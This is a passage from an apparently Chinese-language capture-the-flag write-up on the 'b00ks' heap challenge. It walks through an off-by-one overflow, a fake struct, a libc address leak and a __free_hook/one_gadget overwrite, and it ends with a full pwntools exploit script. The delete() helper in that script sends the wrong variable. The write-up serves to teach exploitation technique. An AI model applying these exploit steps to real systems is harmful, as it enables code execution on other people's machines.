<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x555555607500 = book1_id</span><br><span class="line">0x555555607508 = book1_name</span><br><span class="line">0x555555607510 = book1_desc</span><br><span class="line">0x555555607518 = book1_desc_size</span><br></pre></td></tr></table></figure>
<p>而在没有被纂改前，这段区域其实是book1_desc的内容，感受到不对劲了吗？<br><strong>这段区域我们是可以预先用edit功能布置的</strong>。重新再来一遍，回到溢出前的状态<br><img src="/image-42.png"><br>c回车，选择edit，修改图书内容<br><img src="/image-41.png"><br>回来看看book1_desc的内容<br><img src="/image-43.png"><br>这段6666在我们利用off_by_one漏洞溢出作者名后，会成为fake_book1_id和fake_book1_name<br><strong>明确一下，fake_book1_id和fake_book1_name的内容我们可以通过edit自定义</strong></p>
<p>这有什么用呢？我们的思路是先拿到libc基地址，通过libc基地址去计算__free_hook真实地址，在伪造的图书结构体中部署__free_hook钩子，然后free一个指向one_gadget的地址，触发execve(’&#x2F;bin&#x2F;sh’)拿到shell。那么我们先得拿到libc_base。</p>
<h2 id="4-泄露libc基地址"><a href="#4-泄露libc基地址" class="headerlink" title="4.泄露libc基地址"></a>4.泄露libc基地址</h2><p><strong>当malloc一个接近或超过top_chunk的大小的空间时，程序会使用mmap拓展空间，使得堆以mmap的形式进行扩展。而mmap开辟出的空间与libc基址的偏移是固定的，因此只要拿到mmap开辟出的chunk的地址，就能计算出libc的基地址。</strong><br>看一下top_chunk大小<br><img src="/image-46.png"><br>所以，我们申请一个大于0x20b81的空间，使程序使用mmap拓展空间，这就是book2的申请</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">create(0x21000,b&#x27;BBBB&#x27;,0x21000,b&#x27;bbbb&#x27;)</span><br></pre></td></tr></table></figure>
<p>此时，我们画一下图书在内存中的布局<br><img src="/image-50.png"><br>我们想要得到libc的基地址，可以通过泄露以mmap拓展的这个book2的地址，怎么泄露呢？我们知道当调用Print的时候，程序会打印出来一些信息。<strong>既然想打印出来book2的地址，那么就可以将fake_book1_name指针指向book2_name的地址。Print在打印book1_name的时候，就会找到book2_name，把指针值（因为book2是以mmap拓展，所以book2的指针指向的地址都是0x7fff开头的）打印出来</strong>，看下图<br><img src="/image-51.png"><br>所以只需要将fake_book1_name指向 **0x555555608168 (&#x3D;book1_addr + 0x38,book1_addr是最初我们泄露的地址，也是real_book1_id)**，这样就可以泄露出这个0x7fff开头的地址，从而得到libc<br>用edit布置我们的fake_book1_id为1；fake_book1_name为book1_addr + 0x38</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload = p64(1) + p64(book1_addr + 0x38)</span><br><span class="line">edit(1,payload)</span><br></pre></td></tr></table></figure>
<p><img src="/image-53.png"><br>再利用off by one 漏洞（change作者名），将图书1结构体指针的低位覆盖为\x00，这样fake_book就生效了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">change(b&#x27;aaaabaaacaaadaaaeaaafaaagaaahaaa&#x27;)</span><br></pre></td></tr></table></figure>
<p><img src="/Snipaste_2025-02-15_00-09-32.png"><br>那么此时打印Book1的信息，就可以泄露出“0x7ffff7fd4010”这个地址了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Print()</span><br><span class="line">io.recvuntil(&#x27;Name: &#x27;)</span><br><span class="line">book2_name_addr = u64(io.recv(6).ljust(8,b&#x27;\x00&#x27;))</span><br><span class="line">log.success(&quot;book2 name addr:&quot; + hex(book2_name_addr))</span><br><span class="line">debug()</span><br></pre></td></tr></table></figure>
<p><img src="/image-54.png"><br>前面说过，book2_name的地址，相对libc基地址的偏移是固定的，通过vmmap看到可读可执行的libc.so的起始地址是0x7ffff7800000<br><img src="/image-55.png"><br>我们得到的book2_name_addr的地址是0x7ffff7fd4010，那么</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># book2_name_addr - libc_base = 0x7ffff7fd4010 - 0x7ffff7800000 = 0x7D4010</span><br><span class="line"># 也就是</span><br><span class="line"># libc_base = book2_name_addr - 0x7D4010</span><br></pre></td></tr></table></figure>

<h2 id="5-钩子和one-gadget"><a href="#5-钩子和one-gadget" class="headerlink" title="5.钩子和one_gadget"></a>5.钩子和one_gadget</h2><p>当delete一个book的时候，程序会调用free，所以我们用__free_hook去钩one_gadget<br>先计算__free_hook的地址</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">free_hook = libc_base + libc.symbols[&quot;__free_hook&quot;]</span><br></pre></td></tr></table></figure>
<p>至于one_gadget，因为我们已经泄露libc了，所以One_gadget可以直接在libc.so里面找，然后算上偏移就可以了<br><img src="/image-56.png"><br>看到三个gadget：0x4527a、0xf03a4、0xf1247（不同ubuntu版本得到的不一样，我的版本下第一个可以成功）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">one_gadget = libc_base + 0x4527a        #0x4527a    0xf03a4    0xf1247</span><br></pre></td></tr></table></figure>


<h2 id="6-改善《4-泄露libc基地址》的payload"><a href="#6-改善《4-泄露libc基地址》的payload" class="headerlink" title="6.改善《4.泄露libc基地址》的payload"></a>6.改善《4.泄露libc基地址》的payload</h2><p>我们先想一想，接下来挂钩子明显还是要用到fake_book1结构体，但是不能像之前那要edit(1,xxx)布置了，<strong>因为book1结构体指针已经指向了fake_book1，如果直接edit(1,xxx)会修改fake_book1_desc指针指向的内容，而此时我们意识到我们的fake_book1_desc指针是空的！</strong><br>还记得当时我们当时布置fake_book1是怎么样布置的吗？</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload = p64(1) + p64(book1_addr + 0x38)</span><br><span class="line">edit(1,payload)</span><br></pre></td></tr></table></figure>
<p><img src="/image-57.png"><br>稍微改善一下那时候的payload，把fake_book1_desc这片空白的空间也利用起来：fake_book1_name指向了book2_name，让fake_book1_desc也指向book2_desc</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload = p64(1) + p64(book1_addr + 0x38) + p64(book1_addr + 0x40) + p64(0xffff)     # 0xffff作用内存地址的结束符</span><br><span class="line"># book2_desc和book2_name地址相差8个字节</span><br><span class="line">edit(1,payload)</span><br></pre></td></tr></table></figure>
<p>此时内存是这样的<br><img src="/image-58.png"></p>
<h2 id="7-挂钩子"><a href="#7-挂钩子" class="headerlink" title="7.挂钩子"></a>7.挂钩子</h2><p>改善之后，<strong>调用edit(1,xxx)，程序会直接去修改book2_desc指针为xxx，所以我们通过edit(1,free_hook)把钩子放在book2_desc，再通过edit(2,one_gadget),把one_gadget挂在钩子上，调用delete执行free，GET SHELL!</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">edit(1,p64(free_hook))</span><br><span class="line">edit(2,p64(one_gadget))</span><br><span class="line">delete(2)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h1 id="完整EXP"><a href="#完整EXP" class="headerlink" title="完整EXP"></a>完整EXP</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;, log_level=&#x27;debug&#x27;)</span><br><span class="line">libc = ELF(&quot;/home/kuban/Desktop/pwn/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so&quot;)</span><br><span class="line">io = process(&#x27;./b00ks&#x27;)</span><br><span class="line"></span><br><span class="line">def debug():	</span><br><span class="line">	gdb.attach(io)</span><br><span class="line">	pause()</span><br><span class="line"></span><br><span class="line">def create(name_size , name , des_size , des):</span><br><span class="line">	io.sendlineafter(&#x27;&gt; &#x27;,&#x27;1&#x27;)</span><br><span class="line">	io.sendlineafter(&#x27;size: &#x27;,str(name_size))</span><br><span class="line">	io.sendlineafter(&#x27;: &#x27;,name)</span><br><span class="line">	io.sendlineafter(&#x27;: &#x27;,str(des_size))</span><br><span class="line">	io.sendlineafter(&#x27;: &#x27;,des)</span><br><span class="line"></span><br><span class="line">def delete(book_id):</span><br><span class="line">	io.sendlineafter(&#x27;&gt; &#x27;,&#x27;2&#x27;)</span><br><span class="line">	io.sendlineafter(&#x27;: &#x27;,str(id))</span><br><span class="line"></span><br><span class="line">def edit(book_id,des):</span><br><span class="line">	io.sendlineafter(&#x27;&gt; &#x27;,&#x27;3&#x27;)</span><br><span class="line">	io.sendlineafter(&#x27;: &#x27;,str(book_id))</span><br><span class="line">	io.sendlineafter(&#x27;: &#x27;,des)</span><br><span class="line"></span><br><span class="line">def Print():</span><br><span class="line">	io.sendlineafter(&#x27;&gt; &#x27;,&#x27;4&#x27;)</span><br><span class="line"></span><br><span class="line">def change(author):</span><br><span class="line">	io.sendlineafter(&#x27;&gt; &#x27;,&#x27;5&#x27;)</span><br><span class="line">	io.sendlineafter(&#x27;: &#x27;,author)</span><br><span class="line"></span><br><span class="line">io.sendline(b&#x27;aaaabaaacaaadaaaeaaafaaagaaahaaa&#x27;)</span><br><span class="line">create(208,b&#x27;AAAA&#x27;,32,b&#x27;aaaa&#x27;)</span><br><span class="line">create(0x21000,b&#x27;BBBB&#x27;,0x21000,b&#x27;bbbb&#x27;)</span><br><span class="line">Print()</span><br><span class="line">io.recvuntil(&#x27;haaa&#x27;)</span><br><span class="line">book1_addr = u64(io.recv(6).ljust(8,b&#x27;\x00&#x27;))</span><br><span class="line">log.success(&quot;book1 addr(real_book1_id):&quot; + hex(book1_addr))</span><br><span class="line"></span><br><span class="line">payload = p64(1) + p64(book1_addr + 0x38) + p64(book1_addr + 0x40) + p64(0xffff)</span><br><span class="line">edit(1,payload)</span><br><span class="line">change(b&#x27;aaaabaaacaaadaaaeaaafaaagaaahaaa&#x27;)</span><br><span class="line">Print()</span><br><span class="line">io.recvuntil(&#x27;Name: &#x27;)</span><br><span class="line">book2_name_addr = u64(io.recv(6).ljust(8,b&#x27;\x00&#x27;))</span><br><span class="line">log.success(&quot;book2 name addr:&quot; + hex(book2_name_addr))</span><br><span class="line">libc_base = book2_name_addr - 0x7d4010</span><br><span class="line">free_hook = libc_base + libc.symbols[&quot;__free_hook&quot;]</span><br><span class="line">one_gadget = libc_base + 0x4527a        #0x4527a    0xf03a4    0xf1247</span><br><span class="line">log.success(hex(free_hook))</span><br><span class="line"></span><br><span class="line">edit(1,p64(free_hook))</span><br><span class="line">edit(2,p64(one_gadget))</span><br><span class="line">delete(2)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

]]></content>
  </entry>
</search>
